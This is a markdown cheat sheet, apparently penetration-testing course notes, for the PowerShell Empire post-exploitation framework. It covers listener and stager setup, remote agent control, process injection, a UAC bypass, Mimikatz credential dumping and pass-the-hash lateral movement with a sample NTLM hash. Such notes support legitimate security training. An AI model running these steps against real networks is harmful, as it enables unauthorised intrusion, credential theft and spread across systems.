## PowerShell Empire

PowerShell and Python post-exploitation agent.

### Installation & Setup

The official GitHub has been archived, but there is a maintained fork of the project approved by OffSec at https://github.com/BC-SECURITY/Empire.git

1. Clone the repository with git in the /opt/ directory

   ```bash
   cd /opt
   sudo git clone https://github.com/BC-SECURITY/Empire.git
   ```

2. Run the setup script:

   ```bash
   cd /opt/Empire/setup
   sudo ./install.sh
   ```
   
   Note:  This will prompt you to set a server negotiation password.  For collaboration environments, set a password to be shared with connected servers.  For a stand-alone installation, just press enter to generate a random password.
3. Run PowerShell Empire.  You MUST run it from the Empire directory so it can locate the Database

   ```bash
   cd /opt/Empire/
   sudo ./empire
   ```


### Basic Commands

Empire uses a similar syntax to MSF, including its tab completion.  One big difference is that it is case sensitive.  

```bash
# Show help menu
help

# Return to the previous context menu
back
```

### Setting up an HTTP Listener

Empire's Listeners and Stagers are the equivalent of MSF's multi/handler module.

1. Begin with setting up a listener context

   ```bash
   listeners
   ```

2. Choose a listener to use to enter a context for that particular listener module.  

   ```bash
   uselistener http
   # HTTP is the simplest listener, which tunnels the traffic through HTTP requests.
   
   # You can enter the uselistener command and double-tab to see more choices
   ```

3. Show more info on options for this listener module

   ```bash
   info
   ```

4. Setup options for the listener

   ```bash
   # Required
   set Host 192.168.119.216
   set Port 8000
   
   # Optional
   DefaultDelay	# Amount of time to wait before the target calls back to the listener, designed to make it seem more like HTTP traffic
   DefaultJitter	# Random offset to DefaultDelay to make it seem less programatic to security devices
   KillDate		# Self terminates the listeners on all compromised hosts at a set date.
   ```

5. Start the listener

   ```bash
   execute
   ```

### Setting up a Stager

The stager is responsible for retrieving the agent and it deletes itself once it finishes execution.

1. After setting up a listener, return to the previous context menu

   ```bash
   back
   ```

2. Choose a stager to use:

   ```bash
   usestager windows/launcher_bat
   
   # You can enter the usestager command and double-tab to see more choices
   ```

3. Show more info on options for this listener module

   ```bash
   info
   ```

4. Assign the listener that was just created to this stager

   ```bash
   set Listener http
   ```

5. Create the stager file:

   ```bash
   execute
   ```

### PowerShell Empire Agent

The agent is the final payload retrieved by the stager which allows us to execute commands and interact with the target.  

#### Connecting an Agent

1. Transfer the launcher to the target

2. Execute the launcher on the target to upload the agent

3. List the active agents

   ```bash
   agents
   ```

4. Select an agent to interact with to issue commands:

   ```bash
   # The NAME is a random string, but you can tab it out at least
   interact NAME
   ```

#### Agent Management Commands

These commands are used from the agents context menu.  Do not try to use these from within an agent session, as some have a different function there.

```bash
# Connect to an agent
interact NAME

# Kill an agent session by its NAME
kill NAME

# Remove an orphaned Agent session
remove NAME
```

#### Agent Commands

```bash
# Help menu
help

# Rename the Agent Session
rename NEWNAME

# Target System Information
sysinfo

# Download/Upload a file
download
upload

# Run a shell command
shell "COMMAND"

# Show all running processes on the target
ps

# Terminate a process on the target
kill NAME

# Show active jobs
jobs

# Kill job N
jobs kill N

# Exit the agent session and delete it
exit
```

##### Spawning a new agent

```bash
# Specify the listener to use for the agent (ex. http)
spawn http

# This will take you to a new context menu, just execute to spawn the new agent
execute

# Check that the agent was successfully created
agents
```

##### Migrate the agent to another process

```bash
# This will create a new agent under the process, leaving the old agent active as well.
psinject http PID

# Options
http	# Name of the active listener
PID		# Process ID to migrate to
```

#### Powershell Modules

The agent can load many different modules, similar to Meterpreter.  Modules are divided into categories as well.

```bash
# Double tab after usemodule to see options
# Modules with an * at the end require a high integrity agent session

# NOTE!!! Depending on your context, you may not need the full path to the module.  For instance, from the agent menu, you don't need to specify `powershell/`

usemodule MODULENAME
```

##### Module Commands

Module Info can be seen with the command:

```bash
# Module information
info
```

It has the following fields of interest

- NeedsAdmin:  Set to True if the module requires elevated privileges
- OpsecSafe:  Set to true if the script avoids leaving behind indicators of compromise like temp files or user accounts
- MinLanguageVersion:  Minimum version of the language required to execute the script.  This is good to consider for clients lower than Windows 7 or Server 2008 R2, which were the first to ship with PowerShell v2
- Background:  True if the module executes in the background without visibility for the victim
- OutputExtension:  Output format of any returned files

After setting options, run the module:

```bash
# Run the module
execute
```

##### Situational Awareness

The primary focus of this category is local client and AD enumeration

```bash
# Enumerate the user accounts on the target
usemodule powershell/situational_awareness/network/powerview/get_user
```

##### Credentials and Privilege Escalation

These are found in the `/privesc/` category.

```bash
# Uses several techniques based on misconfigurations to attempt to escalate privileges.
usemodule powershell/privesc/powerup/allchecks

# Bypasses UAC with a registry hack for FodHelper
usemodule powershell/privesc/bypassuac_fodhelper
set Listener NAME
```

With a high integrity session, you can do password dumps with Mimikatz.   

```bash
# Dump cached logon passwords
usemodule credentials/mimikatz/logonpasswords
```

Any discovered credentials are written to the PSE credential store and can be seen with:

```bash
# Show discovered credentials
creds

# Manually add credentials
creds add DOMAIN USER PASSWORD
```

#### Lateral Movement

Move from one PC to another in the network.

Found in `powershell/lateral_movement/`

```bash
# Executes a stager on remote hosts using SMBExec.ps1
usemodule powershell/lateral_movement/invoke_smbexec
set ComputerName Client251
set Listener http1
set Username jeff_admin
set Domain corp.com
set Hash 2892d26cdf84d7a70e2eb3b9f05c425e

usemodule powershell/lateral_movement/invoke_psexec
set ComputerName Client251
```

### Switching Between Empire and MSF

Because each tool has its own strengths, be sure to utilize the tools to get a foothold with the opposite tool, uploading payloads and executing them.